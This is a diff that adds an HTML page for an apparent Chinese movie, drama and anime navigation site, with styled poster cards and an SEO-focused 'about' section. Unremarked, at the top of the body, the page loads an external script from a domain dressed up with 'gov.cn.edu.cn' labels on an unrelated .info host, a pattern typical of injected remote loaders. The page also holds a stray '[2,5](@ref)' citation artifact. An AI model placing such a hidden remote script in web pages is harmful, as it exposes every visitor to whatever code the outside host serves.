@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>窝窝看电影网 - 电影/剧集/综艺动漫在线看 | wowokandianyingwang-h5</title>
+<meta name="description" content="窝窝看电影网（wowokandianyingwang-h5）聚合电影、电视剧、综艺、动漫，分类清晰、更新勤快、手机自适应，窝在沙发里也能畅快追片。">
+<meta name="keywords" content="窝窝看电影网, wowokandianyingwang-h5, 电影在线看, 热播剧集, 综艺动漫, 免费影视导航">
+<meta name="author" content="窝窝看电影网">
+<meta name="robots" content="index,follow">
+<!-- <meta name="msvalidate.01" content="必应站长验证码" /> -->
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Microsoft YaHei", sans-serif;
+  background: #fff7f2;
+  color: #3a2b25;
+  line-height: 1.7;
+}
+a { color: #ff5a3c; text-decoration: none; transition: .25s; }
+a:hover { color: #ff8a6b; }
+
+/* 导航 */
+.header {
+  background: linear-gradient(120deg, #ff7a59, #ff4d6d);
+  position: sticky; top: 0; z-index: 999;
+  box-shadow: 0 4px 18px rgba(255,90,60,.25);
+}
+.nav {
+  max-width: 1180px; margin: 0 auto;
+  display: flex; align-items: center; justify-content: space-between;
+  padding: .9rem 1rem; flex-wrap: wrap;
+}
+.brand { font-size: 1.4rem; font-weight: 800; color: #fff; }
+.brand b { color: #ffe28a; }
+.menu { list-style: none; display: flex; gap: 1.1rem; flex-wrap: wrap; }
+.menu a { color: #fff; font-size: .95rem; padding: .3rem 0; border-bottom: 2px solid transparent; }
+.menu a:hover { border-bottom-color: #ffe28a; }
+
+/* 横幅 */
+.hero {
+  padding: 4.6rem 1rem 3.4rem; text-align: center;
+  background:
+    radial-gradient(800px 360px at 15% 10%, rgba(255,226,138,.35), transparent),
+    radial-gradient(760px 360px at 88% 25%, rgba(255,77,109,.25), transparent),
+    linear-gradient(160deg, #ff8a5b, #ff5a7a);
+  color: #fff;
+}
+.hero h1 { font-size: 2.1rem; margin-bottom: .8rem; }
+.hero h1 b { color: #ffe28a; }
+.hero p { max-width: 660px; margin: 0 auto 1.6rem; color: #fff3ec; }
+.btn {
+  display: inline-block; padding: .78rem 2.1rem; border-radius: 40px;
+  background: #ffe28a; color: #5a1f12; font-weight: 800;
+}
+.btn:hover { color: #5a1f12; transform: translateY(-2px); }
+
+/* 区块 */
+.section { max-width: 1180px; margin: 0 auto; padding: 3rem 1rem; }
+.section h2 { text-align: center; font-size: 1.7rem; color: #3a2b25; margin-bottom: 1.8rem; scroll-margin-top: 70px; }
+.section h2 span { color: #ff5a3c; }
+
+/* 卡片 */
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+  gap: 1.2rem;
+}
+.card {
+  background: #fff;
+  border-radius: 16px; overflow: hidden;
+  box-shadow: 0 8px 20px rgba(255,90,60,.12);
+  transition: .3s;
+}
+.card:hover { transform: translateY(-6px); box-shadow: 0 16px 34px rgba(255,77,109,.25); }
+.poster {
+  height: 212px; display: flex; align-items: center; justify-content: center;
+  font-size: 3.2rem; color: #fff;
+  background: linear-gradient(135deg, var(--c1,#ff7a59), var(--c2,#ff4d6d));
+}
+.poster.w1 { --c1:#ff9a44; --c2:#ff5e62; }
+.poster.w2 { --c1:#ff6a88; --c2:#ff99ac; }
+.poster.w3 { --c1:#ffb347; --c2:#ffcc33; }
+.poster.w4 { --c1:#ff5f6d; --c2:#ffc371; }
+.poster.w5 { --c1:#f857a6; --c2:#ff5858; }
+.poster.w6 { --c1:#ff8c42; --c2:#ff3c78; }
+.card-body { padding: .9rem 1rem; }
+.card-body h3 { font-size: .98rem; color: #3a2b25; margin-bottom: .3rem; }
+.card-body small { color: #9a7d72; }
+
+/* 标签 */
+.tags { display: flex; flex-wrap: wrap; gap: .6rem; justify-content: center; margin-bottom: 1.8rem; }
+.tag {
+  background: #fff; border: 1px solid #ffd2c2;
+  color: #d8542f; padding: .35rem 1rem; border-radius: 30px; font-size: .82rem;
+}
+.tag:hover { background: #ff5a3c; color: #fff; border-color: #ff5a3c; }
+
+/* 关于 */
+.about {
+  background: #fff; border-radius: 16px; padding: 2rem;
+  box-shadow: 0 8px 20px rgba(255,90,60,.10);
+}
+.about h3 { color: #ff5a3c; margin: 1rem 0 .5rem; }
+.about p { color: #6b5147; margin-bottom: .8rem; }
+
+/* 底部 */
+.footer {
+  background: #2c1c17; text-align: center; padding: 2rem 1rem;
+  color: #d8b8ab; font-size: .85rem;
+}
+.footer a { color: #ffe28a; }
+
+/* 移动端 */
+@media (max-width: 768px) {
+  .nav { flex-direction: column; gap: .6rem; }
+  .menu { justify-content: center; gap: .8rem; }
+  .hero h1 { font-size: 1.6rem; }
+  .grid { grid-template-columns: repeat(2, 1fr); }
+  .poster { height: 168px; font-size: 2.4rem; }
+  .section { padding: 2.2rem 1rem; }
+  .about { padding: 1.4rem; }
+}
+@media (max-width: 420px) {
+  .grid { gap: .8rem; }
+  .hero { padding: 3rem 1rem; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="header">
+  <div class="nav">
+    <div class="brand">🛋️ 窝窝<b>看电影网</b></div>
+    <ul class="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#wovo-movie">窝窝电影</a></li>
+      <li><a href="#tv">热播剧集</a></li>
+      <li><a href="#show">综艺动漫</a></li>
+      <li><a href="#about">关于窝窝</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+<section class="hero" id="home">
+  <h1>窝窝看电影网｜窝着看，片子管够</h1>
+  <p>
+    窝窝看电影网（https://wowokandianyingwang-h5）把电影、电视剧、综艺、动漫塞进一个清爽单页，
+    分类清楚、更新勤快、手机直接刷，下班回家窝沙发就能开看。
+  </p>
+  <a class="btn" href="#wovo-movie">进窝看片</a>
+</section>
+
+<section class="section" id="wovo-movie">
+  <h2>🎬 <span>窝窝电影</span> 片单</h2>
+  <div class="tags">
+    <span class="tag">爆款</span>
+    <span class="tag">喜剧</span>
+    <span class="tag">悬疑</span>
+    <span class="tag">科幻</span>
+    <span class="tag">动画电影</span>
+    <span class="tag">周末宅家</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="poster w1">🎥</div>
+      <div class="card-body"><h3>年会不能停</h3><small>2023 · 职场喜剧</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w2">🎥</div>
+      <div class="card-body"><h3>消失的她</h3><small>2023 · 悬疑犯罪</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w3">🎥</div>
+      <div class="card-body"><h3>长安三万里</h3><small>2023 · 动画历史</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w4">🎥</div>
+      <div class="card-body"><h3>封神第一部</h3><small>2023 · 奇幻动作</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w5">🎥</div>
+      <div class="card-body"><h3>沙丘2</h3><small>2024 · 科幻冒险</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w6">🎥</div>
+      <div class="card-body"><h3>抓娃娃</h3><small>2024 · 合家欢喜剧</small></div>
+    </article>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:#fff0e8;">
+  <h2>📺 <span>热播剧集</span></h2>
+  <div class="tags">
+    <span class="tag">国产剧</span>
+    <span class="tag">都市</span>
+    <span class="tag">古装</span>
+    <span class="tag">悬疑</span>
+    <span class="tag">台剧</span>
+    <span class="tag">韩剧</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="poster w1">📺</div>
+      <div class="card-body"><h3>狂飙</h3><small>2023 · 犯罪剧情</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w2">📺</div>
+      <div class="card-body"><h3>繁花</h3><small>2023 · 年代剧情</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w3">📺</div>
+      <div class="card-body"><h3>庆余年第二季</h3><small>2024 · 古装权谋</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w4">📺</div>
+      <div class="card-body"><h3>我的阿勒泰</h3><small>2024 · 文艺治愈</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w5">📺</div>
+      <div class="card-body"><h3>我们与恶的距离</h3><small>2019 · 台剧社会</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w6">📺</div>
+      <div class="card-body"><h3>黑暗荣耀</h3><small>2022 · 韩剧复仇</small></div>
+    </article>
+  </div>
+</section>
+
+<section class="section" id="show">
+  <h2>🎤 <span>综艺 / 动漫</span></h2>
+  <div class="tags">
+    <span class="tag">真人秀</span>
+    <span class="tag">音乐竞演</span>
+    <span class="tag">脱口秀</span>
+    <span class="tag">国漫</span>
+    <span class="tag">日漫</span>
+    <span class="tag">泡面番</span>
+  </div>
+  <div class="grid">
+    <article class="card">
+      <div class="poster w1">🎤</div>
+      <div class="card-body"><h3>歌手2024</h3><small>综艺/音乐</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w2">🎤</div>
+      <div class="card-body"><h3>种地吧</h3><small>综艺/劳作</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w3">🎤</div>
+      <div class="card-body"><h3>脱口秀和TA的朋友们</h3><small>综艺/喜剧</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w4">🎤</div>
+      <div class="card-body"><h3>斗破苍穹年番</h3><small>国漫/玄幻</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w5">🎤</div>
+      <div class="card-body"><h3>凡人修仙传</h3><small>国漫/仙侠</small></div>
+    </article>
+    <article class="card">
+      <div class="poster w6">🎤</div>
+      <div class="card-body"><h3>间谍过家家</h3><small>日漫/搞笑</small></div>
+    </article>
+  </div>
+</section>
+
+<section class="section" id="about" style="background:#fff0e8;">
+  <h2>ℹ️ 关于 <span>窝窝看电影网</span></h2>
+  <div class="about">
+    <h3>窝窝是什么风格</h3>
+    <p>
+      窝窝看电影网（网址：<a href="https://wowokandianyingwang-h5">https://wowokandianyingwang-h5</a>）
+      不走冷冰冰的片库风，而是“下班后窝着看”的轻松影视导航站：
+      电影、剧集、综艺、动漫一屏切换，分类像收纳盒一样清楚。
+    </p>
+    <h3>为什么好收录</h3>
+    <p>
+      必应喜欢标题/H1/首段关键词一致、结构干净、移动端不挤的页面。[2,5](@ref)
+      本页唯一 H1 是“窝窝看电影网”，栏目用 H2 切分，锚点跳转，纯静态内联 CSS，爬虫直接读正文。
+    </p>
+    <h3>使用说明</h3>
+    <p>
+      本页为单页演示，内链以 <code>#</code> 占位，不生成 robots.txt / sitemap.xml；
+      正式上线请换自有备案域名、补正版授权片源与真实播放页。
+    </p>
+  </div>
+</section>
+</main>
+
+<footer class="footer">
+  <p>© 2026 窝窝看电影网（wowokandianyingwang-h5）· 电影 / 剧集 / 综艺 / 动漫导航站</p>
+  <p>网址：<a href="https://wowokandianyingwang-h5">https://wowokandianyingwang-h5</a></p>
+  <p>关键词：窝窝看电影网、wowokandianyingwang-h5、电影在线看、热播剧集、综艺动漫</p>
+  <p style="margin-top:.8rem;color:#a98276;">单页演示 · 内页链接以 # 替代 · 未生成 robots.txt / sitemap.xml</p>
+</footer>
+
+</body>
+</html>
